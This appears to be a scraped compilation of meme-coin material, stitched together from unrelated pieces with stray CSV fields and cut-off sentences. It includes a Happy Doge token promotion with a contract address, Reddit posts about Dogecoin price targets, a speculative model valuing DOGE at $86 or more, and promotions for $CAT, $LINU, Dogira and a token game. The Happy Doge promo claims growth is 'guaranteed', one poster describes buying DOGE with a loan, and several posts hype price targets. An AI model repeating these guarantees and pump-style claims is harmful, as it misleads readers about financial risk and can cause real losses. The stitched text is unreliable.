Happy Doge is an interesting meme cryptocurrency capable of quick worldwide adoption. Happy Doge is different from Dogecoin: it is more technologically developed, has great tokenomics, and is able to generate much more profit to its holders!

**How does it compete to other meme coins?** 

Happy Doge is a community-driven digital currency which combines efficient transactions with next-generation DeFi-oriented features. While the original Dogecoin was a very simplistic cryptocurrency, Happy Doge is full of high quality functions which make it a much better asset for any blockchain investor.

**I am a member of the Happy Doge community for a week now! What have I seen so far?**

As a member of the community I have seen massive feedback from the team. They are very active on the telegram chat and also there is a voice chat where you can simply go and hear their thoughts and position related to the future of the coin. They have been transparent enough for me to fully trust their initiative and their brave goals.

**Why should you HODL? Check it out!**

Happy Doge collects a 6% tax on each transaction which occurs on its respected network, and the collected amount is stored in a smart contract. When a sale of Happy Doge occurs, a portion of that amount is utilized to automatically purchase tokens from the liquidity pool.

The purchased tokens are immediately burned and removed from the supply forever, which means that Happy Doge is a highly deflationary cryptocurrency. Because of that, the continuous rate of growth over time is guaranteed.

💰**Transaction fee deep dive**:

Rewards for holders: 2% 

Marketing :3% 

Buy-back :6% (keeps the price of the token in check)

Slippage recommended :13% 

**🚨Token Allocation**:

Liquidity :45% 

Initial burn: 45.5%

Marketing :5.5%

Dev tokens burned :4.84%

Dev tokens locked: 0.16%

💎**Tokenomics:**

Name: Happy Doge

Symbol: HADO

Total Supply: 1,000,000,000,000,000

Token Decimals: 9

**📝 Contract:** 

0x55654DF0005B2916b21A2ca5232c6768Ce86e24b

The entire LP will be locked for the first 365 days after the token launch. Thus, rapid growth of Happy Doge in the initial stage of the project is expected

**Happy Doge Roadmap**

DOGE,Altcoin,Will Dogecoin Continue Its March,"11/6/2024 3:00 PM #Dogecoin Update:

#DOGE/USDT is breaking out of a descending triangle pattern on the 15 Min and 1H Chart! 📈🐕💥 Let’s see if it can continue this uptrend to the next two Monthly Resistance Zones between $0.22003 and $0.22888 from March and April 2024! 🚀💰

If it breaks those levels, there’s nothing stopping it from reaching the next Monthly Resistance at $0.29730 from November 2021! 🌌✨

But if it gets rejected from that Monthly Resistance Zone, it will probably head down to the Monthly Support Zone between $0.17980 and $0.17500 where it should hold steady. 🔻💪 https://coinmarketcap.com/currencies/dogecoin/",3,2024-11-06 20:21:56,35
DOGE,Altcoin,"I took out a loan to buy more DOGECOIN, Here we go! (Week 6 Update)"," 

At the time of this post, the current price is oscillating between 12 and 14 cents, a few cents below where I used the loan to purchase 41k more DOGE (18.5 cents).

My total portfolio is in the red by like $40k or so, at this very second I'm typing this.

**Remember, altcoins last cycle had a \~60% correction before prices skyrocketed.**

I saw a post somewhere that had the projected Fibonacci pattern pushing us anywhere between $3-$6 per coin. I'm just adding here and there, so I ca n get to my 350k DOGE goal, at $3 I'd be the first millionaire in my family. I also plan on giving 10% of my earnings away to my local church, and part of it Imma also give some away in higher education scholarships. STAY FOCUSED!

I made my first payment on the loan last Friday, and overall feel alright, although greener days would be nice. I will continue to add about $20-$50 here or there as my budget permits, in the meantime I'm still 300k DOGE strong over here!

Onto Week 7! HODL!

Took out a loan last week (March 22) and bought more DOGE, bringing me to nearly 300k DOGE. SO far I'm up 42% over the last week.

**I've done the math and studied the charts for the last 3 years. I think this is an asymmetrically positive opportunity. Of course I have exit strategy, tax filing steps, and overall preparation to ladder out effectively. Its imperative to plan accordingly for any investment you undertake.**

I have a good job and can cover the monthly, and I won't hold the loan for the full 60-month duration. Thank God bull cycles don't last 60 months.

I wouldn't mind being the first millionaire in my family, but foremost I want to help others with investing and financial literacy! We will WIN!

DOGE,Altcoin,An Introspective look on Dogecoin's future: $86 DOGE?,"The valuation model is constructed around these main variables:

* Total Value of Products and Services (TVPS): This metric assesses the aggregate value of all goods and services that can be purchased with the currency, providing a direct measure of its economic utility.
* Stock to Flow Ratio (SFR): Calculated as the ratio of total supply to new supply, this metric provides an insight into the currency’s scarcity.
* Total Supply: Represents the aggregate number of currency units currently in circulation.
* New Supply: Fixed annual increase in total supply, adding predictability to the currency's inflation rate.
* Velocity of Money (VOM): Measures the frequency at which each currency unit is used for transactions within a specified timeframe, indicating the liquidity and economic activity of the currency.

The Formula:Coin Value = (TVPS / (Total Supply \* VOM) \* SFRThe Total Value of Products and Services (TVPS) is a crucial metric in determining the value of a coin, especially in frameworks where the coin is used as a medium of exchange within a specific economy or ecosystem. Here’s how it significantly impacts the coin's value:

1. Direct Measure of Economic Utility: TVPS represents the aggregate value of all goods and services that can be bought using the coin over a certain period, usually a year. This measure reflects the economic utility of the coin—how useful it is for actual transactions. A higher TVPS indicates that the coin is widely accepted and used, thereby increasing its practical value.
2. Basis for Demand: The more goods and services a coin can buy, the higher the demand for that coin might be. If a coin is the only or primary means of purchasing significant services and products, its necessity and thus its value would likely increase as more users adopt it for daily transactions.
3. Indicator of Stability and Growth: An increasing TVPS suggests that the economy or ecosystem around the coin is growing. Stability in TVPS or consistent growth can signal to investors and users that the coin is a reliable store of value, potentially driving up its price due to increased confidence.
4. Pricing Mechanism: In a market where multiple currencies (digital or fiat) compete, the TVPS can serve as a crucial differentiator. It helps in pricing the coin relative to others by showcasing its purchasing power parity within its operational ecosystem. If a coin can purchase more or higher-value services and goods compared to another, it can be perceived as having a higher inherent value.
5. Feedback Loop for Development: A robust TVPS can encourage further investments into the services and products priced in the coin. This, in turn, can create a positive feedback loop where increased utility leads to higher demand, which then drives further economic activities denominated in the coin.

In sum, TVPS is not just a reflection of the coin’s current worth but also a forward-looking indicator that can influence investor behavior, user adoption, and overall market dynamics surrounding the coin. By effectively measuring and potentially increasing the TVPS, stakeholders can strategically enhance the perceived and real value of the coin within its operating environment. The Velocity of Money is a critical economic indicator in assessing the value of a coin, especially in systems where the coin functions as an active medium of exchange. Here's a detailed look at how the velocity of money impacts a coin's value:

1. Measurement of Economic Activity: Velocity of money refers to the rate at which money is exchanged from one transaction to another and measures how frequently a unit of currency is used to purchase goods and services within a given time period. High velocity indicates a high level of economic activity, as the currency is quickly changing hands, suggesting strong demand and usage.
2. Influence on Supply and Demand Dynamics: In a cryptocurrency or any monetary system, if the velocity of the currency is high, it implies that each unit of currency is being used repeatedly to facilitate transactions. This can effectively increase the supply of money in circulation without physically increasing the total supply, impacting inflation and the purchasing power of the currency.
3. Indicator of Economic Health and Confidence: A higher velocity of money typically signifies a healthy, active economy where confidence in the stability and utility of the currency is strong. People are more likely to spend the currency rather than hold onto it, which can support a higher valuation as it reflects trust and utility in the medium of exchange.
4. Relationship with Price Levels: According to the equation of exchange in economics, MV=PQ (where M is the money supply, V is the velocity of money, P is the price level, and Q is the output of goods and services), an increase in the velocity of money, assuming a constant money supply, can lead to higher price levels. This relation can also influence the value of the coin, as changes in price levels (inflation or deflation) directly affect how much the coin is worth in terms of purchasing power.

In summary, the velocity of money is a multifaceted indicator that not only reflects the current state of an economy or a specific currency’s ecosystem but also actively influences the perceived and intrinsic value of the coin through its effects on economic activity, supply-demand balances, and inflationary pressures. Understanding and strategically managing this velocity can be key to enhancing a currency’s value and stability.The Stock to Flow Ratio is a significant metric, particularly in the context of commodities like gold and silver, and has been adapted to assess the value of cryptocurrencies like Bitcoin. The SFR measures the scarcity of a particular asset and is calculated by dividing the total stock (existing supply) by the flow (annual production rate). Here’s how it plays a crucial role in determining a coin's value:

1. Measure of Scarcity: The SFR directly quantifies the scarcity of an asset. A higher ratio indicates that the asset is less readily available relative to its production, suggesting greater scarcity. For cryptocurrencies, a high SFR implies that new coins are being added to the total supply at a slow rate compared to the existing stock, which can enhance the perception of the coin as a scarce resource.
2. Indicator of Value Over Time: Historically, assets with higher SFR (like gold and silver) have maintained their value over long periods due to their scarcity and lower rates of supply expansion. In cryptocurrencies, a rising S2F ratio over time can signal that the coin is becoming increasingly scarce, potentially driving up its value if demand remains steady or increases.
3. Influence on Investor Perception: Investors often view assets with high SFR as ""harder"" assets. In the realm of cryptocurrencies, a high SFR can attract investors looking for assets that are less susceptible to inflation or dilution, much like traditional store-of-value assets such as gold.
4. Predictive Power for Future Prices: Some models, particularly those applied to Bitcoin, have used the SFR to predict future price increases. These models assume that as the production rate decreases (typically through mechanisms like halving events in Bitcoin), the reduced flow relative to the existing stock will drive up prices.
5. Comparison Across Assets: The SFR model allows for a comparison between different assets based on their scarcity. This can be particularly useful in the cryptocurrency market, where different coins have different issuance schedules and caps, affecting their SFR and, consequently, their perceived long-term value.

In summary, the Stock to Flow ratio is a crucial metric for assessing the scarcity and potential long-term value of a coin. It provides a quantitative foundation that helps investors and analysts understand how the rarity of an asset relates to its market value and helps predict how its price may evolve based on changes in supply dynamics. This makes SFR a valuable tool for strategic investment decisions in both commodity markets and the growing field of digital currencies.

# Data and Analysis

For this analysis, we are only using Tesla's total revenue from all its products and services, including the hypothetical addition of robotics and expanded licensing of Full Self-Driving technology, amounts to $250 billion. This figure will serve as the Total Value of Products and Services (TVPS) in our model to estimate the value of a hypothetical digital coin associated with Tesla. Parameters for the Coin Valuation Model:

* Total Value of Products and Services: $250 billion
* Total Supply: 144.33 billion coins
* Velocity of Money: 0.02
* New Annual Supply: 5.256 billion coins

SFR = Total Supply / New Annual Supply = 27.45Base Coin Value = TVPS / (Total Supply \* VOM) = $86.61Coin Value = Base Value \* SFR = $2,377.65This derived coin value reflects the combined economic utility and scarcity of the coin within this modeled framework. It illustrates how significant the scale of Tesla’s operations could potentially influence the value of a digital currency linked to its economic activities and scarcity dynamics. This model provides a theoretical financial metric that can help in understanding the impact of corporate revenue and production strategies on associated digital assets.

# Discussion

In this study, we utilized a composite model integrating traditional economic indicators with modern financial metrics specific to digital currencies to derive the value of a hypothetical coin associated with Tesla's economic activities. The Stock to Flow Ratio is instrumental in differentiating this model from traditional fiat currency models, such as those used for the [$USD](https://x.com/search?q=%24USD&src=cashtag_click). Unlike fiat currencies, which are typically inflationary due to their increasing supply, the modeled digital coin has a predefined supply growth rate, leading to an increasing SFR over time. This increment in the SFR indicates a decreasing rate at which new coins are added relative to the existing supply, enhancing the coin's scarcity and potential value. In contrast to fiat currencies like the USD, which lose purchasing power over time due to inflationary pressures and policy-driven supply increases, a digital currency with a high and increasing SFR is designed to gain purchasing power. This is primarily due to its comparative scarcity and reduced rate of new supply introduction, which, ceteris paribus, should lead to an appreciation in value if demand remains constant or grows. The mechanism here is akin to that of precious metals like gold, which have historically served as hedges against inflation. This model suggests that digital currencies with increasing SFR could command a premium in the financial markets. Investors might view such currencies as safer stores of value over the long term, particularly in economic environments where traditional currencies are depreciating. The analysis thus highlights the potential of [#Dogecoin](https://x.com/search?q=%23Dogecoin&src=hashtag_click)  to not only serve as effective mediums of exchange but also as robust long-term investments that may outperform inflationary fiat currencies in maintaining purchasing power. The increased Stock to Flow Ratio (SFR) of a digital currency like Dogecoin suggests a growing scarcity and potential appreciation in value over time compared to more inflationary currencies such as the USD. In economic terms, as Dogecoin becomes scarcer and its purchasing power potentially increases, the relative cost of goods and services priced in Dogecoin should logically decrease if these prices are indexed to a currency experiencing inflation, like the [USD.To](http://USD.To) integrate this into pricing strategies, businesses could apply an indexed discount for payments made with Dogecoin, reflecting its expected long-term appreciation. This discount reflects not only the current exchange rate but also the anticipated future value of Dogecoin, thereby incentivizing customers to use the cryptocurrency for transactions. It also compensates for the potential 'opportunity cost' of spending a deflationary currency today rather than holding it. This approach can benefit both consumers and businesses:

* For Consumers: It provides a tangible benefit to using Dogecoin over traditional currencies, potentially saving money due to the currency's appreciation.
* For Businesses: It encourages more transactions in Dogecoin, increasing its circulation and utility as a currency. Moreover, businesses that hold onto Dogecoin received from transactions may benefit from its appreciation.

Transforming Dogecoin from a speculative asset into a functional currency also change the dynamics of its volatility:

* Increased Utility: As Dogecoin transitions to being used more as a currency than an asset, its utility in everyday transactions increases. This widespread use can help stabilize its value as it becomes more integrated into regular economic activities.
* Reduced Speculation: When a cryptocurrency like Dogecoin is primarily used for speculation, its price is highly susceptible to market sentiments and speculative trading. As it shifts towards functioning as a currency, its value becomes more closely tied to its utility and less to investor speculation.
* Market Depth and Liquidity: Increased usage as a currency can enhance market depth and liquidity. This means more buyers and sellers at any given time, which typically reduces price volatility because the market can absorb larger transactions without impacting the price significantly.

# Conclusion

The proposed valuation model for [$Doge](https://x.com/search?q=%24Doge&src=cashtag_click) provides a robust framework that combines principles from traditional hard money systems with modern digital economy analytics. This approach allows for a more grounded and economically justified valuation of digital currencies, which can help stabilize perceptions and foster more informed decision-making in financial markets. The base value of $86.61 for [$Doge](https://x.com/search?q=%24Doge&src=cashtag_click) should be regarded as the logical fundamental value of the coin, given the TVPS. The fundamental value is rarely reflected on open markets that are more driven by human sentiment. Factoring in SFR combined with an increasing TVPS can push the coin value to non-reasonable levels when observed from a fundamental perspective. If Dogecoin provides premium access to General Artificial Intelligence, Self Driving Vehicles and Humanoid Robots, the estimated value of ≈$2,500 is too low.

Prices across major exchanges including Binance, Bitfinex, FTX, Gemini, and Poloniex are posting around 22% gains over a 24-hour period. The cryptocurrency is currently changing hands for around $0.53. The increase came even as other major cryptocurrencies’ prices sank.

Meanwhile, U.S. cryptocurrency exchange Coinbase announced it would be adding DOGE to its suite of crypto offerings in six to eight weeks, likely due to client demand as has been the case with other major exchanges.

eToro said it’s adding Dogecointo the cryptocurrencies traded on its exchange due to client demand. eToro's 20 million users around the world will now be able to trade the Shiba Inu-represented crypto. It joins the likes of Kraken, Crypto.com, OKEx, and other [exchanges that list the cryptocurrency](https://www.coingecko.com/en/coins/dogecoin#markets).

Gemini Exchange Users Can Now Earn Interest on Dogecoin. The Winklevoss brothers-founded cryptocurrency exchange, has added Dogecoin to the cryptocurrencies supported by its Earn lending program, allowing customers to earn interest on their holdings.

About Dogira

Dogira is a DeFi staking platform and blockchain gaming studio built on the Polygon network. The team aims to bring about a revolution in blockchain gaming by creating good games first, then adding play-to-earn elements later. The project is helmed by a former Dogecoin dev, Eoghan Hayes, who was responsible for implementing the Gravity Well algorithm alongside Digibyte—paving the way for Dogecoin to explode earlier this year. 

Eoghan and his team are fully doxxed, all with many years of experience in their respective fields. Dogira recently launched its “DoFi” (Dogira Finance) staking ecosystem where the company intends to invite collaborators to launch their games and respective tokens on DoFi. Dogira also has an in-house games development team, Dogira Studios, dedicated to creating groundbreaking blockchain games. 

The $DOGIRA token can be staked to earn collaborators tokens and will become the primary token used to back blockchain games in DoFi.

DOGE,Altcoin,"Dogecoin up 30% this week, expect more increase before Wednesday next week"," 

Dogecoin  is expected to be a huge buy over the weekend.  Currently trading  around 0.003100 range.  Asia was able to boost the coin to almost 3200  range (will not put additional 0 in front from here on out).

​

It  is possible and maybe even realistic that Dogecoin can see a high as  far up as 2800 by the time the weekend starts.  Leading myself to  predict a price of 4000 (0.004) is the price to see before the September  5th promotion of the Doge-ETH bridge; which I must inform is an Alpha  stage.  That said, if you do not know what the Doge-Eth bridge is; I  have linked the most recent article below:

DOGE,Altcoin,Altcoin Pegged to USD Cure for Current Exchange Woes (Originally posted in /r/dogecoin),"Copy of a post originally in /dogecoin subreddit:

If a new altcoin was launched where the mining dificulty was determined by its value vs. the USD a lot of the issues caused by exchanges and conversion of coins could be prevented. Basically this altcoin (lets call it greenbackcoin) had an optimal exchange rate of 1 greenbackcoin = 1 USD. Then if it was trading at over 1 USD the mining dificulty would be reduced to increase the # of coins in circulation and lower each coins value. If the value was below 1 USD the difficulty would increase, depleting the new coins available and driving up the price. This way anyone who wanted to ""cash out"" of whatever coin they were in could exchange their coins for greenbacks with relative ease (compared to actually obtaining usd via an exchange). This would increase the liquidity of every crypto-coin market and make it that much harder for any government to regulate digital currency. If the coin took off, I think it would quickly maintain a value very close to 1 USD. The equivalent of daytrading algorithms would allow investors to capitalize on slight deviations (buy low, sell high) both in the greenback to USD market and the altcoin to greenback market, keeping rates near perfect.

This would prevent something like the collapse of Mt Gox from decimating the value of a coin, since the greenback would be a decentralized, self perpetuating currency.

The one concern would be ensuring that mining was all in all a profitable endevour, since the currency being pegged to the USD could impact the profitability of mining. Im not sure how to do this but I do have one potential idea. Since the greenback would offer a benefit to every other coin perhaps there could be the requirement that anyone who held above a certian # of greenbacks operate a mining rig. Thus requiring those who wish to hold large amounts of the currency either mine, or have an account with a mining operation that held their greenbacks for them, incentivizing the mining operation. Such miners would then become defacto exchanges.

DOGE,Altcoin,Can $CATS Make a Comeback? Token Faces Uncertainty After Price Drop and Bold New Moves,"The $CATS token hit the market with excitement, but its low market cap quickly raised red flags for investors. After an early price surge, it soon crashed to $0.0000576, following the same path as other struggling tokens like $DOGS.

  
Right now, $CATS is priced at $0.0001228, down 75% from its peak. Compared to $DOGS, which boasts a market cap of $401.96 million, $CATS sits far behind at just $73.78 million. The rapid price drop has left the token oversold, hinting at a possible rebound, though market confidence is still shaky.

  
In a bid to bring traders back, the Bitget team has launched the CATS x Bitget Fortune Ticket event. For every $10 of $CATS trades, participants earn tickets for a chance to win prizes. This event, running until Oct 14, is designed to boost short-term trading and spark new interest in the token.

  
Adding to the mix, the announcement of Season 2 has triggered rumors of a potential buyback strategy, which could help drive prices higher. If successful, $CATS could climb to $0.0003 or more. But if the plan doesn’t deliver, the token could see further losses.

  
In short, $CATS is a risky, speculative investment. Its future depends on how well the team executes their upcoming strategies. Investors should proceed with caution and watch developments closely.

DOGE,Altcoin,Why I believe $CAT will reach billions ,"It’s a cat season and $CAT (Simon’s Cat) will be the leading coin of this bullrun. Some huge news are coming this month and you definitely do not want to miss this.

The market cap of cat themed memecoins is 10 times lower than the market cap of dog memecoins. This is why I believe we are just a few months away from the biggest cat season ever. And Simon’s Cat will be the leading coin of this meta for sure.

$CAT might look like a basic cat coin but opposite is the truth. The team behind $CAT is experienced, rich and know exactly what to do and how to do it to make this project really reach billions.

And the meme itself definitely deserves billions cause Simon’s Cat is a world-wide known cartoon character + the team is making insane high-quality memes that trend on all their socials.

They already listed $CAT on the majority of the biggest exchanges in the world like OKX, [Gate.io](http://Gate.io), KuCoin or HTX.

And the community is also absolutely insane. With nearly 230k holders, 60k Telegram members and insane 200k X followers. It is just a matter of time until we reach billions because the community members are helping with everything they can to pump their bags and help $CAT go where it belongs.

Worth mentioning is also the fact that the team burned around $25M worth of tokens and made a partnership with FLOKI, one of the biggest memecoins ever.

Honestly, don’t sleep on this. Projects like $CAT do not stay under billion for too long so it is just a matter of time until Binance lists $CAT and it will become one of the biggest memecoins ever.

DOGE,Altcoin,A DOGE’s Mediocre Rise,"🚀 DOGE to the Moon! Market Cap Hits $42 Billion as Price Soars to $0.30 📈✨

By Bitlender, Investigative Blogger/Technical Analyst 📊

Dogecoin (DOGE) has taken the crypto world by storm once again! With a 92% price surge in a week, this meme coin has soared past $0.30, becoming the 6th largest cryptocurrency by market cap, beating XRP and USDC! Let’s dig into what’s driving this rally and where DOGE might go next. 🚀🐕💥

Key Stats and Market Momentum 📊🔥

	1.	Market Cap: $42.3 billion, ranking 6th in crypto.
	2.	Price Surge: Over 90%, pushing DOGE above $0.30 📈.
	3.	Trading Volume: Up 220%, hitting $16.8 billion daily.
	4.	Liquidations: $64M liquidated, with $36M in shorts closed 💸.

DOGE’s rally aligns with a broader crypto surge and recent optimism following Trump’s election win. Meme coins like SHIB and PEPE also gained this week, adding fuel to the DOGE hype! 🐕‍🦺💥

Technical Analysis 🔍: Support & Resistance 📉📈

	•	Support: $0.2800 and $0.2614 – Crucial levels if DOGE retraces 📉.
	•	Resistance: $0.3000 and $0.3034 – Breaking above could push further gains 🎯.

DOGE’s recent climb through $0.220 resistance, reaching a high of $0.3034, shows bullish strength, with consolidation hinting that buyers are still engaged.

Volume and Indicators 🔄💹

A Rising Wedge Pattern hints at potential moves; the MACD stays bullish, and the RSI above 50 shows steady buying interest. DOGE holds above its 100-hour SMA, suggesting market support for potential breakouts. 📊🚦

Fibonacci Extensions: 🚀 $3.95 to $23.26? 🤯💰

Based on Fibonacci levels, DOGE could aim for $3.95 or even $23.26 if current support holds strong.

Conclusion: 🚀 To the Moon or Breather? 🌕🐕

DOGE’s rally reflects renewed interest in meme coins, with indicators showing potential for $0.32. But beware, meme coins swing wildly!

The article explores the idea behind LADYS as a possible candidate to repeat the success of Dogecoin and many others.


What are your thoughts on this? Do you think memecoins are here to stay or will we see them fade over time?

DOGE,Altcoin,"Why does the price always go up or down so sharply?
","I've always wondered, does crypto have eyes and ears on the back of its head?

Like why is it that political events or world events cause the prices to drop suddenly? Or better yet, a high profile individual says something and seemingly in an instant the price goes up or down.

If crypto was truly decentralized, why is it so easily affected by what people or the media says? Why is it like the weather, where we have to forecast it? If it all just computer code, shouldn't it be predictable by the minute? If everyone is buying and holding, why does it suddenly decide to go up or down based off of what happens?

Dogecoin is one, but Bitcoin and all of the others do the same thing...

This mobile-quality roguelike RPG features 36 beautifully designed characters, each playing a crucial role in the intense narrative of reclaiming a fallen Tokyo. The game is further elevated by renowned voice actors from famous anime and original songs for each of the 36 characters, performed by these voice actors and popular artists. All the music is available through the prestigious avex trax label.

At the heart of the game's economy is $GEEK, the main governance token. With a total supply of 2 billion tokens, $GEEK provides liquidity and serves as the foundation for in-game activities. In addition to $GEEK, the game features xGEEK, an off-chain stablecoin that allows players to enjoy a seamless free-to-play experience. Players can earn xGEEK through in-game actions, which can later be exchanged for $GEEK, adding further value to the in-game economy.

The game also boasts a dual NFT asset system that includes NFT dolls and NFT equipment, both of which are essential for battles and character enhancements. These NFTs, which come in the form of weapons, armor, and accessories, can be acquired using $GEEK, offering real utility and value to token holders. Players can also earn $GEEK through various in-game activities such as PvP challenges, Guild vs Guild matches, and exploring land dungeons. Additionally, players can discover GEEK boxes and rare NFT assets through the game's build mode.

DOGE,Altcoin,Exploring Memecoins Across Blockchains: Discovering Hidden Gems,"Yo, let's talk about memecoins on different blockchains! 🌐

So, I've been checking out a few memecoins lately, and here's the scoop:

On Ethereum, you've got some classics like Dogecoin and Shiba Inu. They're like the OGs of the memecoin scene, with huge communities and wild fluctuations.

Then there's Binance Smart Chain (BSC), home to tokens like SafeMoon and Baby Doge. They're all about those crazy reflections and tokenomics.

But you know what's really catching my eye right now? $Powsche on Solana. It's like the underdog of the bunch, but it's got serious potential. The community is super tight-knit, and they're doing some cool stuff with NFTs and charity projects.

Overall, each blockchain has its own vibe when it comes to memecoins. Ethereum for the big names, BSC for the reflections, and Solana for that hidden gem like $Powsche. Definitely worth keeping an eye on! 🚀

I want Mr. Musk to tweet all day about Dogecoin, and see it go up.

But for whatever reason, he has shown a little apprehension to do so. My hypothesis is that he was sued into oblivion last 2021 cycle post-SNL. I wasn't in DOGE back then, but I saw and remember first-hand the euphoria that occurred when some people I knew turned $300 into $30k. It was also dangerous, as he became a god-like figure in the crypto world.

Basically, I wanna remind everyone why we're here. Sure, Elon is a cool guy (I suppose), but we have SO much more going for DOGE. Back in 2017, we had a 120x, and that was pre-Elon. We shouldn't rely on one guys doing to boost the asset, so chill and touch grass anon.

All I'm saying is, with more global-crypto adoption (X payments, other businesses, potential ETF), to

BE FRICKING READY! My targets suggest \~$3 this cycle :).

DOGE,Altcoin,Banano and the founder of Doge,"Dear altcoiners!

Some meme coins are original - most are not. Seeing a creation date of 2021 probably gives you a clue for  what you\`re up for.

Banano was created april 1st, 2018. The project along with the community has been built for three years and it resembles the early days of doge - even btc. Monkeys create memes, tip each other off and nothing else matters. It has a use case besides holding onto it and hoping for a greater fool to buy you out. Banano is also one of the top contributors to folding@home (medical research).

The reason for this post is the following: [https://www.reddit.com/r/banano/comments/n9oz27/creator\_of\_dogecoin\_here\_was\_told\_to\_check\_this/](https://www.reddit.com/r/banano/comments/n9oz27/creator_of_dogecoin_here_was_told_to_check_this/)

In other words, Banano has and always will be a true meme coin, second only to Doge. Its not about the price, but rather the fun and wholesome community.

DOGE,Altcoin,$LINU Roadmap is out!!,"https://preview.redd.it/r5p83bjgytzc1.jpg?width=720&format=pjpg&auto=webp&s=405e5a3f57d48abfd3172076167ef6657287443f

# Roadmap Explained

**Phase 1**

After much effort and removal of bad actors from the old community takeover, February marked the end of Phase 1. Our biggest accomplishment from Phase 1 would be the establishment of a Multi-sig wallet to act as a Community donation pool. All funds currently go to prospective marketing and delivery of funds to CEXes.  
Though we have no current plans to burn any tokens at this price level, a future token burn can be held using the Multi-sig / Donation pool.

**Phase 2**

Given our current state, some parts of Phase 2 are finished and others will need to be constantly revisited.  
We’re still looking for bigger and better CEXes. We will still pursue creative ways to market LINU.

**Phase 3**

Firstly, **LINU MERCH STORE ON REDBUBBLE!!!!**  
All profits go to the Community Multisig.  
If you wish to contribute a design to the shop, please contact us on Telegram (fast response time) or Twitter (slower response time).

As said before, there will be some repeatable steps in each Phase.  
Community engagement and growth is always something LINU will be wrestling with. We have a core that isn’t going anywhere but growth is always welcome. We can pursue a branding update / logo redesign if the Community agrees.

**Phase 4**

Here’s the fun Phase.  
For the sake of not spoiling anything yet, work on a game for LINU has started.  
An NFT redemption collection is an eventuality after we reach a few larger milestones.  
Tier 1 CEXes like CDC, Binance and Coinbase are what we’re shooting for when it becomes appropriate for us. We will do all we can to lay the groundwork for them in the mean time.

That’s all we can disclose for this Phase at this time.

**Phase 5**

*Now we’re getting very ambitious!*

Following in the footsteps of Dogecoin and SHIB, we wish to do more of the same.  
Approaching this Phase, LINU plans to be everywhere at once.  
A global brand if you will.

We also plan to push LINU to participate in the GameFi space eventually.  
We believe a utility project (Aviator) could facilitate the blockchain infrastructure necessary to host a LINU game fully on-chain somewhere in the future.

Still on the topic of Blockchains, we think Luna Inu can initiate it’s own DEX in the way of SHIB with Shibarium given the proper backing.

**Phase 6**

Oh yeah, we’re serious.

*See you in Monaco with the F1's!!*

**Persistence is key.**

Through so much volatility, our community hasn’t given up.  
Our team hasn’t given up either. We’re still taking the necessary steps to keep the token alive.

**Join us for the ride while it’s still early!**

DOGE,Altcoin,I've learnt from the errors of others when it comes to investing.,"Meme currencies such as Shiba Inu, Dogecoin, and Mononoke Inu have no underlying fundamentals that could have predicted their stellar growth. 

In other words, they're not like a corporation that has a monopoly on its industry and has seen its stock price skyrocket. 

Many people claim to be adorable, yet they do not have an exact purpose. They go on to say that some cryptos genuinely serve a function. For example, Ethereum is a platform that enables financial transactions to be validated and kept without the involvement of a third party such as a bank.   
The growth of meme currencies, on the other hand, demonstrates how strong average investors can be when they join together on Reddit or Twitter. If there is enough interest in crypto, and additional investors join in, the value of that coin will continue to rise. 

In my experience, whenever I see the hype about a meme coin on Reddit or Discord, I put a small portion of my portfolio into it in case it skyrockets, as I did with Mononoke Inu and Shiba. 

What are your thoughts on meme coins? [https://coinmarketcap.com/currencies/mononoke-inu/](https://coinmarketcap.com/currencies/mononoke-inu/)",7,2022-01-20 21:58:12,59

DOGE,Altcoin,Altcoin Fundamental Analysis 101: How to Avoid Losers and Pick Winners,"**TL;DR: Professional altcoin researchers like** [**Crypto Pragmatist**](https://cryptopragmatist.com/sign-up/) **and** [**Blocmates**](https://www.blocmates.com/) **understand three fundamental things a cryptocurrency before investing in it: the value proposition, the supply and demand, and the stakeholders behind it.**

&#x200B;

**The Universal Law of Crypto**

People who simply knew of and understood crypto in its early days have now been rewarded with hundreds of billions of dollars of wealth. And while crypto price action has been volatile, the industry has been consistent in two things since its inception:

1. **Those who understand cryptocurrencies have been financially rewarded.**
2. **Those who invest in cryptocurrencies without understanding have been financially punished.**

&#x200B;

**The Three Rules for Altcoin Analysis**

If knowledge inefficiency allows us to create outsized returns for our portfolio, then the way to create reliable alpha (excess ROI) is to set up a repeatable process where we can research and understand cryptocurrencies. Fundamental analysis is difficult, but it does not require special education, exclusive information, or super-genius level brains.

>**In today's market conditions, any halfway-clever investor can perform research that will allow them to generate better-than-average returns on their cryptocurrency portfolios.**

In my time as as an Altcoin Research Analyst, I've established a simple fundamental framework I go through to perform basic prospecting on all of the cryptocurrencies I research.

While this framework isn't comprehensive, it is a starting point that will give you a solid foundation for better understanding cryptocurrencies, and thus, make better investing decisions. I've broken it down into three rules: three questions to which you must have answers.

If you have a strong grasp on how these three rules apply to the altcoin you're researching, you are well on your way to making a good, informed investing decision for the given cryptocurrency.

&#x200B;

https://preview.redd.it/lbw9il08egt71.png?width=1600&format=png&auto=webp&s=2b4690472999512436cbc30b05d99095567b134b

The single most important thing to understand in a cryptocurrency is how it provides value for its users. This can often be distilled down to just a few words or sentences, but it sometimes can be tricky to wrap your head around.

We'll take a look at a few of the biggest cryptos for inspiration:

* **Bitcoin:** “a decentralized digital currency, without a central bank or single administrator, that can be sent from user to user on a peer-to-peer network without the need for intermediaries.”
* [Ethereum](https://coinmarketcap.com/currencies/ethereum/)**:** “a decentralized, open-source blockchain with smart contract functionality.”
* [Polkadot](https://coinmarketcap.com/currencies/polkadot-new/)**:** “a blockchain network that connects, builds, and hosts blockchains.”

Conversely, many cryptos thought to be poor investments have flimsy (or sometimes no) value propositions

* [Bitconnect](https://coinmarketcap.com/currencies/bitconnectx-genesis/)**:** Crypto’s most famous scam intended to “build trust and reputation in bitcoin and cryptocurrency ecosystem with Open-source platform.” (What does that even mean?)
* [Safemoon](https://www.coingecko.com/en/coins/polkadot)**:** When you start diving into Safemoon’s documentation, you find a lot more related to their tokenomics (burning and redistributing sold Safemoon) than the value it hopes to add to the world.

https://preview.redd.it/827dxhu8egt71.png?width=1600&format=png&auto=webp&s=d91ecc84b4fd1cf7ee4d34d02d9155a19ef37212

If you couldn't explain to your Mom/Dad/Relative how this might add value to the world, it's a signal you need do more research and reading. White papers, the foundational documents of cryptos, are pretty helpful in this respect, (look up ""target cryptocurrency"" + white paper to find it) although they can be quite dense. Project roadmaps, often hosted on the crypto's official website are helpful as well.

Explore your curiosity and dive into what you don't understand. This is not the time to be shy or embarrassed about what you don't get, you're going to be putting your hard-earned money on the line: Twitter, Reddit, and Discord are all your friends.

Understanding how a crypto creates value allows you to:

1. Establish a thesis for why the crypto will rise in value
2. Determine when that thesis has been invalidated

This value proposition will serve as the foundation for the rest of your research.

